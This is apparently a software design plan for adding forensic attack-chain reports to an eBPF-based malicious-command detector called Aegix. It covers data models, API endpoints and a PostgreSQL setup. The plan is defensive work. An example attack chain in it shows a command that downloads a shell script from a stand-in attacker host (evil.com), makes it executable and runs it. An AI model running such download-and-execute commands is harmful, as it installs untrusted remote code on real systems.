# Scaling Aegix: Forensic Report Engine

## Background

The current Aegix architecture is a single-node FastAPI backend backed by SQLite, with a Logistic Regression ML model detecting malicious kernel commands via eBPF hooks. Data flows one-way: `eBPF → Agent → DetectionPipeline → SQLiteEventStore`.

This plan adds the **Forensic Report Engine** — on-demand and scheduled investigation reports that reconstruct an attack chain (who did what, in what order, with what impact), exportable as PDF/JSON/HTML.

---

## User Review Required

> [!IMPORTANT]
> **Storage backend decision**: The current SQLite store is file-based and single-writer. Scaling forensic reports across multiple agents requires a shared database. The plan introduces **PostgreSQL** as the primary event store. If you want to keep SQLite (dev-only), the forensic engine will work in degraded mode but cannot handle concurrent multi-agent writes reliably.

> [!WARNING]
> **LLM API cost**: The Forensic Report Engine generates narrative summaries using the Groq/Gemini LLM API. Each report synthesis call costs tokens. High-volume deployments should implement a report cache or offline batch mode. The plan includes a caching layer but you should review the rate limits set in `config.py`.

---

## Open Questions

> [!IMPORTANT]
> 1. **Report trigger**: Should reports be auto-generated on every `malicious` classification, only on demand via API, or both?
> 2. **Report retention policy**: How long should forensic reports be retained? (30 days / 1 year / indefinitely)?
> 3. **Multi-agent topology**: Are you running one agent per host or multiple agents feeding a single backend?

---

## Architecture Overview

```
┌──────────────────────────────────────────────────────────────┐
│                    Aegix Scaled Architecture                  │
├──────────────┬──────────────────┬───────────────────────────┤
│  eBPF Agent  │   FastAPI Core   │   New Components           │
│  (kernel/)   │   (app.py)       │                            │
│              │                  │  ┌──────────────────────┐  │
│  execve_hook │→ DetectionPipeline→ │  ForensicReportEngine│  │
│              │   rule_engine    │  │  - AttackChainBuilder│  │
│              │   ml_scorer      │  │  - NarrativeSynth.   │  │
│              │                  │  │  - PDFExporter       │  │
│              │→ SecurityEvent   │  └──────────┬───────────┘  │
│              │   EventStore     │             │               │
│              │   (PostgreSQL)   │  ┌──────────▼───────────┐  │
│              │                  │  │  ForensicReportStore  │  │
│              │                  │  │  (reports table)      │  │
│              │                  │  └──────────────────────┘  │
└──────────────┴──────────────────┴───────────────────────────┘
```

---

## Proposed Changes

### Component 1: Forensic Report Engine

Reconstructs **attack narratives** from correlated security events in the existing `SQLiteEventStore` / PostgreSQL store.

#### [NEW] `backend/forensics/attack_chain.py`
`AttackChainBuilder` — given a time window or session ID, queries `security_events` and builds a directed graph of causally-related events:

```
[pid=1024 bash -c wget...]
        ↓ spawned
[pid=1025 wget http://evil.com/shell.sh]
        ↓ spawned
[pid=1026 chmod +x shell.sh]
        ↓ spawned
[pid=1027 ./shell.sh]  ← MALICIOUS (score: 94.2)
```

Correlation logic:
- **PID/PPID chain**: parent-child process relationships from existing `ExecveEvent.pid` / `ppid`
- **Session affinity**: events sharing the same `session_id`
- **Temporal proximity**: events within a configurable time window (default 5 minutes)
- **User correlation**: events sharing the same `uid`/`gid`

#### [NEW] `backend/forensics/narrative.py`
`NarrativeSynthesizer` — takes the `AttackChain` graph and sends a structured prompt to the existing Groq/Gemini LLM integration (`groq_explainer.py`) to generate:
- Executive summary (2-3 sentences)
- Technical attack narrative with MITRE ATT&CK technique mapping
- Recommended remediation steps
- IOC (Indicators of Compromise) list

#### [NEW] `backend/forensics/exporter.py`
`ReportExporter` — renders the report to:
- **JSON** (machine-readable, full fidelity)
- **PDF** (via `weasyprint` or `reportlab`) with Aegix branding
- **HTML** (inline viewing in frontend)

#### [NEW] `backend/forensics/report_store.py`
`ForensicReportStore` — persists generated reports to the `forensic_reports` table in the existing SQLite/PostgreSQL database.

#### [MODIFY] [pipeline.py](file:///c:/New%20folder/Kernal_AI_Security/backend/detection/pipeline.py)
After every `malicious` classification, optionally trigger async forensic report generation:

```python
if result.classification == "malicious" and settings.auto_forensic_reports:
    asyncio.create_task(
        forensic_engine.generate_report(session_id=session_id, trigger_event_id=event_id)
    )
```

---

### Component 2: Data Model Extensions

#### [MODIFY] [models.py](file:///c:/New%20folder/Kernal_AI_Security/backend/events/models.py)
Extend `SecurityEvent` with:
- `report_id: Optional[str]` — link to generated forensic report

#### [NEW] `backend/forensics/models.py`
```python
@dataclass
class ForensicReport:
    report_id: str
    trigger_event_id: str
    session_id: Optional[str]
    time_window_start: float
    time_window_end: float
    attack_chain: List[SecurityEvent]  # causally ordered
    mitre_techniques: List[str]        # e.g. ["T1059.004", "T1105"]
    ioc_list: List[str]
    executive_summary: str
    technical_narrative: str
    remediation_steps: List[str]
    severity: str  # "critical", "high", "medium"
    generated_at: float
    export_formats: Dict[str, str]     # {"pdf": "/path/...", "json": "..."}
```

---

### Component 3: API Endpoints

#### [MODIFY] [app.py](file:///c:/New%20folder/Kernal_AI_Security/backend/app.py)
New REST endpoints only for forensics:

| Method | Path | Description |
|---|---|---|
| `POST` | `/forensics/reports` | Trigger manual report generation |
| `GET` | `/forensics/reports` | List all reports (paginated) |
| `GET` | `/forensics/reports/{report_id}` | Get report details + narrative |
| `GET` | `/forensics/reports/{report_id}/export` | Download PDF/JSON/HTML |
| `GET` | `/forensics/reports/{report_id}/chain` | Get attack chain graph |

---

### Component 4: Infrastructure Upgrade

#### [MODIFY] [docker-compose.yml](file:///c:/New%20folder/Kernal_AI_Security/docker-compose.yml)
Add PostgreSQL for multi-agent concurrent writes (Redis removed since no audit bus needed):

```yaml
services:
  postgres:
    image: postgres:16-alpine
    environment:
      POSTGRES_DB: aegix
      POSTGRES_USER: aegix
      POSTGRES_PASSWORD: ${POSTGRES_PASSWORD}
    volumes:
      - pg_data:/var/lib/postgresql/data

  backend:
    # existing config +
    depends_on: [postgres]
    environment:
      - DATABASE_URL=postgresql://aegix:${POSTGRES_PASSWORD}@postgres:5432/aegix

volumes:
  pg_data:
```

#### [MODIFY] [config.py](file:///c:/New%20folder/Kernal_AI_Security/backend/config.py)
Add new settings:
- `DATABASE_URL` — PostgreSQL connection string (falls back to SQLite for dev)
- `AUTO_FORENSIC_REPORTS` — bool, auto-generate on malicious events
- `FORENSIC_REPORT_TTL_DAYS` — retention period
- `REPORT_STORAGE_BACKEND` — `"local"` | `"s3"`

---

## New File Tree

```
backend/
├── forensics/
│   ├── __init__.py
│   ├── attack_chain.py     ← NEW: AttackChainBuilder (graph correlation)
│   ├── narrative.py        ← NEW: LLM narrative synthesis + MITRE mapping
│   ├── exporter.py         ← NEW: PDF/JSON/HTML export
│   ├── report_store.py     ← NEW: Report persistence
│   └── models.py           ← NEW: ForensicReport dataclass
├── events/
│   └── models.py           ← MODIFY: Add report_id field to SecurityEvent
├── detection/
│   └── pipeline.py         ← MODIFY: Trigger forensic tasks on malicious events
├── app.py                  ← MODIFY: 5 new /forensics/* API endpoints
└── config.py               ← MODIFY: New env vars

docker-compose.yml          ← MODIFY: Add postgres service
```

---

## Verification Plan

### Automated Tests

```bash
# Unit tests for attack chain correlation
pytest tests/test_attack_chain.py -v

# Integration test: end-to-end event → forensic report
pytest tests/test_forensic_report_e2e.py -v

# Verify no regression in detection pipeline
pytest tests/test_detection_pipeline.py -v
```

### Manual Verification
1. Fire a sequence of malicious commands via `/analyze` with the same `session_id`
2. Call `GET /forensics/reports` and confirm a report was auto-generated
3. Download the PDF export and verify the attack chain is ordered correctly by PID/PPID
4. Verify the MITRE ATT&CK techniques in the narrative match the matched rules
